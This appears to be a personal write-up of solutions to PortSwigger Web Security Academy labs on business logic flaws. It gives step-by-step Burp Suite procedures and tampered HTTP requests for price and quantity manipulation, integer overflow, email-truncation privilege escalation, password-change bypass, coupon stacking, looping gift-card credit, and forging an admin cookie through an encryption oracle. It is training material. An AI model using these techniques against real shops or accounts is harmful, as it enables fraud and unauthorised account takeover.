# Portswigger
## Business Logic Vulnerabilities // Application Logic Vulnerabilities
### Excessive trust in client-side controls
```bash

# This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

# You can log in to your own account using the following credentials: `wiener:peter`

Log in
Go to "Lightweight l33t leather jacket"
Intercept is on
Click "Add to cart"
Change the price to "2" (0 does not work)

productId=1&redir=PRODUCT&quantity=1&price=2

Go to cart and purchase for $0.02

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042545.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715035727.png)

### High-level logic vulnerability
```bash

# This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

# You can log in to your own account using the following credentials: `wiener:peter`

Log in
Intercept is on
Add a "Lightweight l33t leather jacket" to your cart
Send to repeater
Intercept is off
Look for a different item in this case productId "6" i.e. "There is No 'I' in Team" with a price tag of $12.94
Change the product ID to "6" and the quantity to "-103"
Buy the product for $4.18

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715035752.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715035820.png)

### Low-level logic flaw
```bash

# This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

# You can log in to your own account using the following credentials: `wiener:peter`

Log in
Intercept is on
Add a "Lightweight l33t leather jacket" to your cart
Send to repeater
After testing parameters you find that you can add up to 99 of this item
Send to intruder
Clear all parameters on 'Positions' page
Go to: Payloads
Payload type: Null payloads
Payload Options[Null payloads]
Continue indefinately
Start attack
Proof of concept when refreshing page to see that the $ goes very high and into negative numbers
Add an additional item into your cart
Go to: Payloads
Payload Options[Null payloads]
Generate: 323
This will land near to 0, but in negative numbers

-$63999.12 (Total)/ 1337 (Leather jacket) = 47.8

Go to: Repeater
Send a quantity of 47 leather jackets

-$1160.12

Use the additional item you added into the cart and add this item until you have a < $100 && > 0 price tag

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042621.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042655.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040046.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042727.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042753.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040158.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040224.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040240.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042835.png)

### Inconsistent handling of exceptional input
```bash

# This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete Carlos.

Make sure your browser burp proxy is on and intercept is off
Refresh the home page
Go to: Target
Site map
Right click the current website you are enumerating -> Engagement tools -> Discover content -> Start 'Session is not running'
Eventually an admin panel is enumerated
If you go to the end-point

https://ac611f961eb57feac047ae21004b0050.web-security-academy.net/admin

You are greeted with this message

'Admin interface only available if logged in as a DontWannaCry user'

On the website register a username
Email must be +200 characters followed by the content in your exploit server email that follows the @ sign i.e.

attacker@exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net

To

exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net

Go to: Register
Note : If you work for DontWannaCry, please use your '@dontwannacry.com' email address

Username: 

username

email: 

portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun@exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net

password:

peter

Confirm in the email client
Login as the new-found user
Take note that the email is cut off when being initially greeted

Your email is: portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun@exploit-ac341f241ec17fb4c09faef6014d00bb.web-se

The goal is to put .exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net right after @dontwannacry.com
The email cuts off at 255 characters so if you put .exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net just after 255 characters
then the confirmation email should go to the exploit server
Note: the text editor 'gedit' starts at 1 and not 0 so .exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net must start at 256 in this case
Create a new user
Username:

username2

email:

ortswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun-portswigger-fun@dontwannacry.com.exploit-ac341f241ec17fb4c09faef6014d00bb.web-security-academy.net

password:

peter

Check the email client for a confirmation email
Log in as username2
The admin panel should be present
Visit the admin panel and delete the user 'carlos'

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040420.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040445.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040518.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040611.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040648.png)

### Inconsistent security controls
```bash

# This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete Carlos.

Make sure your browser burp proxy is on and intercept is off
Refresh the home page
Go to: Target
Site map
Right click the current website you are enumerating -> Engagement tools -> Discover content -> Start 'Session is not running'
Eventually an admin panel is enumerated
If you go to the end-point

https://ac611f961eb57feac047ae21004b0050.web-security-academy.net/admin

You are greeted with this message

'Admin interface only available if logged in as a DontWannaCry user'

On the website register a username
Username:

username

Email:

attacker@exploit-ac9f1f631e5aca82c07c17e401720016.web-security-academy.net

password:

anything

Login as this user
Go to: "My account"
Change the email to username@dontwannacry.com
Go to: Admin panel
Delete the user "carlos"


```

### Weak isolation on dual-use endpoint
```bash

# This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete Carlos.

# You can log in to your own account using the following credentials: `wiener:peter`

Login as wiener:peter
Go to: "My account"
Intercept is on
Username: 

wiener

Current password: 

peter

New password: 

peter2

Confirm new password:

peter2

Send this to repeater
For some reason this password changed, but this information is irrelevant
Change the username:

administrator

Remove the password parameter, the password, and a & like so:

csrf=p8l3u2z8mHrr2hUenY1ZVnaAaoIq5nsX&username=administrator&current-password=&new-password-1=peter2&new-password-2=peter2

To

csrf=p8l3u2z8mHrr2hUenY1ZVnaAaoIq5nsX&username=administrator&new-password-1=peter2&new-password-2=peter2

Login as administrator:peter2

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715040951.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041050.png)

### Insufficient workflow validation
```bash

# This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

# You can log in to your own account using the following credentials: `wiener:peter`

Login as wiener:peter
Go to: Home
Add a lower price item to the cart
Purchase the item
Go to: HTTP History

GET /cart/order-confirmation?order-confirmed=true HTTP/1.

Take note of:

/cart/order-confirmation?order-confirmed=true

Add "Lightweight l33t leather jacket" to cart
Purchase the item
Go to: HTTP History

GET /cart?err=INSUFFICIENT_FUNDS HTTP/1.1

Send the above GET request to repeater and change to:

GET /cart/order-confirmation?order-confirmed=true HTTP/1.

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041156.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041229.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041322.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041354.png)

### Authentication bypass via flawed state machine
```bash

# This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete Carlos.

# You can log in to your own account using the following credentials: `wiener:peter`

Intercept is on
Login as wiener:peter
Forward request until you reach:

GET /role-selector HTTP/1.1

Drop request
Visit

https://acb71f231efea6a2c04f8caf004b00f5.web-security-academy.net/

Now "Admin panel" will be present
Delete the username "carlos"

```

### Flawed enforcement of business rules
```bash

# This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

# You can log in to your own account using the following credentials: `wiener:peter`

Login as wiener:peter
Take note of 'New customers use code at checkout: NEWCUST5'
Go to bottom of page and enter an email address

"Use coupon SIGNUP30 at checkout!"

Add "Lightweight l33t leather jacket" to cart
Go to Cart
![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041257.png)
Add the 'SIGNUP30' coupon
Add the 'NEWCUST5' coupon
Add the 'SIGNUP30' coupon
Repeat this process until the total is $0.00

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041427.png)

### Infinite money logic flaw
```bash

# This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

# You can log in to your own account using the following credentials: `wiener:peter`

Login as wiener:peter
Take note of the coupon section on the "My account" page
Go to: "Home"
Go to the bottom of the page and enter an email

'Use coupon SIGNUP30 at checkout!'

Add a "Gift card" to your cart
Apply the coupon code
Purchase the item
Take the gift card code and apply it on the "My account" page under "Gift cards"
Your store credit went from $100.00 to $103.00

Go to: HTTP history

POST /gift-card HTTP/1.1

csrf=insUvaHw8aBWz3iZk6V3HojZmcvQGrDt&gift-card=tvDADhMADP

Go to: Project options
Session Handling Rules -> Add -> Scope
URL Scope: Inlcude all URLs
Details -> Rule Actions -> Add -> Run a macro -> Add
Add these end-points

POST /card HTTP/1.1

POST /cart/coupon HTTP/1.1

POST /cart/checkout HTTP/1.1

GET /cart/order-confirmation?order-confirmed=true HTTP/1.1

POST /gift-card HTTP/1.1

In the Macro Editor choose the GET request of /cart/order-confirmation?order-confirmed=true -> Configure item
Custom parameter locations in response -> Add
Parameter name: 'gift-card'
Go to response
Update config based on selection below: highlight the gift-card code
In the Macro Editor choose the POST request to /gift-card -> Configure item
gift-card: Derive from prior response
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to intruder
Clear the positions page
Go to: Payloads
Payload type: Null payloads
Payload Options[Null payloads]
Generate: 412 payloads
Go to: Resource Pool
Maximum concurrent requests: 1
Start attack
Go to: "Home"
Add a "Lightweight l33t leather jacket" to cart
Purchase "Lightweight l33t leather jacket"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041504.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041529.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041603.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041645.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041711.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041736.png)

### Authentication bypass via encryption oracle
```bash

# This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete Carlos.

# You can log in to your own account using the following credentials: `wiener:peter`

Login as wiener:peter
Go to: Home
Click "View post"
Leave a comment with a normal email
click "back to blog"
Leave an additional comment this time with an incorrect email

wrong.email.com

Go to: HTTP history

POST /post/comment HTTP/1.1

Send to repeater

Also:

GET /post?postId=5 HTTP/1.1

Send to repeater
Go to repeater for:

POST /post/comment HTTP/1.1

Copy: 

jNQ5PYBXThe9UbpTcHXn0MLVyzjzjVLegXY4B7ZnRYw%3d

From:

stay-logged-in=jNQ5PYBXThe9UbpTcHXn0MLVyzjzjVLegXY4B7ZnRYw%3d

Go to repeater for: 

GET /post?postId=5 HTTP/1.1

Replace:

notification=Zisx9IRODQpzG5wncrFcLcBqFdMMn7BSxJnR38IJT3RzZO3bCeT%2b61p2EEjrQNxZ

With

notification=jNQ5PYBXThe9UbpTcHXn0MLVyzjzjVLegXY4B7ZnRYw%3d

Note the response contains:

wiener:1652404285092

Change repeater 1:2 to encrypt:decrypt

In encrypt change:

csrf=3NXKYV35ErVIRbNw1R8gQ7g0LirtAjFd&postId=5&comment=wrong&name=name&email=wrong.email.com&website=

To

csrf=3NXKYV35ErVIRbNw1R8gQ7g0LirtAjFd&postId=5&comment=wrong&name=name&email=administrator:1652404285092&website=

Copy:

Set-Cookie: notification=j2uekPaXgr7oN%2bmcGApykcncP32UjqUV7BQaL24SC0m6oZnEyM2DZkV8neK4bVaURuCn7xcInnI8CIe9jwxBsQ%3d%3d; 

Go to decrypt:

Change the "notification" cookie to (emulating the administrator:1652404285092 response):

j2uekPaXgr7oN%2bmcGApykcncP32UjqUV7BQaL24SC0m6oZnEyM2DZkV8neK4bVaURuCn7xcInnI8CIe9jwxBsQ%3d%3d

Note the "Invalid email address: administrator:1652404285092"
The goal is to cut out the "Invalid email address: " section of the above string
"Invalid email address: " = 23 bytes

Send the encoded response to Decoder

j2uekPaXgr7oN%2bmcGApykcncP32UjqUV7BQaL24SC0m6oZnEyM2DZkV8neK4bVaURuCn7xcInnI8CIe9jwxBsQ%3d%3d

Decode content:
URL-decode
Base-64 decode
Delete 23 bytes
Re-encode content:
Base-64 encode
URL-encode

%46%65%77%55%47%69%39%75%45%67%74%4a%75%71%47%5a%78%4d%6a%4e%67%32%5a%46%66%4a%33%69%75%47%31%57%6c%45%62%67%70%2b%38%58%43%4a%35%79%50%41%69%48%76%59%38%4d%51%62%45%3d

Go to decrypt:
Place 

%46%65%77%55%47%69%39%75%45%67%74%4a%75%71%47%5a%78%4d%6a%4e%67%32%5a%46%66%4a%33%69%75%47%31%57%6c%45%62%67%70%2b%38%58%43%4a%35%79%50%41%69%48%76%59%38%4d%51%62%45%3d

Into the GET request

GET /post?postId=5 HTTP/1.1

Cookie: notification=%46%65%77%55%47%69%39%75%45%67%74%4a%75%71%47%5a%78%4d%6a%4e%67%32%5a%46%66%4a%33%69%75%47%31%57%6c%45%62%67%70%2b%38%58%43%4a%35%79%50%41%69%48%76%59%38%4d%51%62%45%3d; session=lnfbYP75b3DqJmO7bess1phMoKUJEmWI; stay-logged-in=8yYBZDyTHrJNAKkaZ0j3S9%2fr5N947vGNP4AX35XnXUg%3d

Note the response:

Input length must be multiple of 16 when decrypting with padded cipher

Go to encrypt:
Add 9 characters to the "administrator:1652404285092" email
This will add 9 bytes to the soon to be deleted 32 bytes
The initial 23 bytes + 9 bytes == 32 bytes // 32 is divisible by 16 as per "Input length must be multiple of 16 when decrypting with padded cipher"

csrf=3NXKYV35ErVIRbNw1R8gQ7g0LirtAjFd&postId=5&comment=wrong&name=name&email=xxxxxxxxxadministrator:1652404285092&website=

Send this request then capture the "Set-Cookie: notification" response excluding the semi-colon

Set-Cookie: notification=j2uekPaXgr7oN%2bmcGApykemQCmppXxjqwW6SHHOEOCwdoEGQXJtZkd7V3bQNc05ux6lcgUZRE4CsuiF4C9almA%3d%3d; 

Send to decoder:

j2uekPaXgr7oN%2bmcGApykemQCmppXxjqwW6SHHOEOCwdoEGQXJtZkd7V3bQNc05ux6lcgUZRE4CsuiF4C9almA%3d%3d

Decode content:
URL-decode
Base-64 decode
Delete 32 bytes
Re-encode content:
Base-64 encode
URL-encode

%48%61%42%42%6b%46%79%62%57%5a%48%65%31%64%32%30%44%58%4e%4f%62%73%65%70%58%49%46%47%55%52%4f%41%72%4c%6f%68%65%41%76%57%70%5a%67%3d

Go to decrypt:
Place

%48%61%42%42%6b%46%79%62%57%5a%48%65%31%64%32%30%44%58%4e%4f%62%73%65%70%58%49%46%47%55%52%4f%41%72%4c%6f%68%65%41%76%57%70%5a%67%3d

Into the GET request

GET /post?postId=5 HTTP/1.1

Cookie: notification=%48%61%42%42%6b%46%79%62%57%5a%48%65%31%64%32%30%44%58%4e%4f%62%73%65%70%58%49%46%47%55%52%4f%41%72%4c%6f%68%65%41%76%57%70%5a%67%3d; session=lnfbYP75b3DqJmO7bess1phMoKUJEmWI; stay-logged-in=8yYBZDyTHrJNAKkaZ0j3S9%2fr5N947vGNP4AX35XnXUg%3d

Response:

HTTP/1.1 200 OK

administrator:1652404285092

Go to: Proxy
Intercept is on
Click "Home"

Change

Cookie: session=lnfbYP75b3DqJmO7bess1phMoKUJEmWI; stay-logged-in=8yYBZDyTHrJNAKkaZ0j3S9%2fr5N947vGNP4AX35XnXUg%3d

To

Cookie: stay-logged-in=
%48%61%42%42%6b%46%79%62%57%5a%48%65%31%64%32%30%44%58%4e%4f%62%73%65%70%58%49%46%47%55%52%4f%41%72%4c%6f%68%65%41%76%57%70%5a%67%3d

*Upon failure*
Send the request:

GET / HTTP/1.1

With response:

HTTP/1.1 400 Bad Request

To repeater

Cookie: stay-logged-in=%48%61%42%42%6b%46%79%62%57%5a%48%65%31%64%32%30%44%58%4e%4f%62%73%65%70%58%49%46%47%55%52%4f%41%72%4c%6f%68%65%41%76%57%70%5a%67%3d

Success
Access the "Admin panel" and delete the user "carlos"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041833.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041903.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041932.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715041957.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042041.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042113.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042139.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042206.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042232.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042256.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042319.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042350.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220715042414.png)

#hacking
